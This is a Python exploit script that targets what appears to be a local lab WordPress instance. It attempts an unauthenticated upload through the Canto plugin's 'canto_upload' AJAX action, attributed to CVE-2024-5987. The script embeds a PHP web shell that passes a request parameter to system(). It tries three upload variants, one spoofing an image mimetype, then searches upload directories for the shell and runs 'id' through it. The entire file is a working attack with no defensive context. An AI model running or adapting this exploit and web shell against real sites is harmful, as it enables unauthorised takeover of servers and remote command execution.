import requests
import re
import os

# Configuration  
target_url = "http://127.0.0.1:32816"
ajax_url = f"{target_url}/wp-admin/admin-ajax.php"

# Create the PHP webshell
shell_name = "shell.php"
shell_content = '<?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";die;}?>'

# Try without cookies since CVE-2024-5987 is supposed to be unauthenticated
print(f"[+] Testing CVE-2024-5987 (unauthenticated) at {ajax_url}")
print(f"[+] Uploading webshell: {shell_name}")
print(f"[+] Using NO authentication cookies to test unauthenticated access")

# CVE-2024-5987: The vulnerability allows unauthenticated file upload via canto_upload action
# Let's try with minimal required fields first
try:
    # Method 1: Basic unauthenticated attempt without cookies
    files = {
        'action': (None, 'canto_upload'),
        'type': (None, 'media'),
        'file': (shell_name, shell_content, 'application/octet-stream')
    }
    
    print(f"\n[+] Attempt 1: Unauthenticated multipart upload")
    response1 = requests.post(ajax_url, files=files, timeout=30)
    
    print(f"[+] Response Status: {response1.status_code}")
    print(f"[+] Response Body: {response1.text}")
    print(f"[+] Response Headers: {dict(response1.headers)}\n")
    
    # Method 2: Try with additional fields that plugins often require
    files2 = {
        'action': (None, 'canto_upload'),
        'type': (None, 'media'),
        'name': (None, shell_name),
        'filename': (None, shell_name),
        'file': (shell_name, shell_content, 'application/octet-stream')
    }
    
    print(f"[+] Attempt 2: With filename field")
    response2 = requests.post(ajax_url, files=files2, timeout=30)
    
    print(f"[+] Response Status: {response2.status_code}")
    print(f"[+] Response Body: {response2.text}\n")
    
    # Check if any response indicates vulnerability exists
    for i, response in enumerate([response1, response2], 1):
        if response.status_code == 200:
            print(f"[+] Attempt {i} returned 200 - checking for success indicators")
            if any(indicator in response.text.lower() for indicator in ['success', 'uploaded', 'file', shell_name]):
                print(f"[!] Potential success in Attempt {i}!")
                print(f"[!] Response: {response.text[:500]}")
        elif response.status_code == 400:
            print(f"[-] Attempt {i} returned 400 - Bad Request (same as before)")
        elif response.status_code == 403:
            print(f"[-] Attempt {i} returned 403 - Permission Denied")
        elif response.status_code == 404:
            print(f"[-] Attempt {i} returned 404 - Not Found")
        else:
            print(f"[?] Attempt {i} returned {response.status_code}")
    
    # Method 3: Check if the endpoint requires different parameter structure
    # Some plugins expect data in different format
    print(f"\n[+] Attempt 3: Alternative parameter structure")
    
    data = {
        'action': 'canto_upload',
        'type': 'media'
    }
    
    files3 = {
        'file': (shell_name, shell_content, 'image/png')  # Try with fake mimetype
    }
    
    response3 = requests.post(ajax_url, data=data, files=files3, timeout=30)
    
    print(f"[+] Response Status: {response3.status_code}")
    print(f"[+] Response Body: {response3.text}\n")
    
    # Summary
    print(f"[+] SUMMARY of all attempts:")
    print(f"[+] Attempt 1 (basic): {response1.status_code}")
    print(f"[+] Attempt 2 (with filename): {response2.status_code}")
    print(f"[+] Attempt 3 (alternative structure): {response3.status_code}")
    
    # Check for any JSON responses that might contain error details
    for i, response in enumerate([response1, response2, response3], 1):
        try:
            if response.text.strip().startswith('{') or response.text.strip().startswith('['):
                import json
                json_data = json.loads(response.text)
                print(f"[+] Attempt {i} JSON response: {json_data}")
        except:
            pass
    
    # If any attempt succeeded, try to find the uploaded file
    success_responses = [r for r in [response1, response2, response3] if r.status_code == 200]
    
    if success_responses:
        print(f"\n[!] One or more attempts succeeded - checking for uploaded file...")
        
        common_paths = [
            "/wp-content/uploads/2024/06/shell.php",
            "/wp-content/uploads/shell.php",
            "/wp-content/uploads/canto/shell.php",
            "/wp-content/uploads/canto-media/shell.php",
            "/wp-content/uploads/2024/08/shell.php"
        ]
        
        for path in common_paths:
            full_url = f"{target_url}{path}"
            print(f"[+] Checking: {full_url}")
            
            check_response = requests.get(full_url, timeout=15)
            if check_response.status_code == 200 and '<?php' not in check_response.text:
                print(f"[!] SUCCESS! Shell accessible at {full_url}")
                print(f"[!] Testing command execution...")
                
                cmd_url = f"{full_url}?cmd=id"
                cmd_response = requests.get(cmd_url, timeout=15)
                print(f"[!] Command output: {cmd_response.text}")
                break
            else:
                print(f"[-] Not found or not executing")
    
    print(f"\n[*] CVE-2024-5987 Testing Complete")
    
except Exception as e:
    print(f"[!] Error during testing: {e}")
    print(f"[!] Error details: {str(e)}")
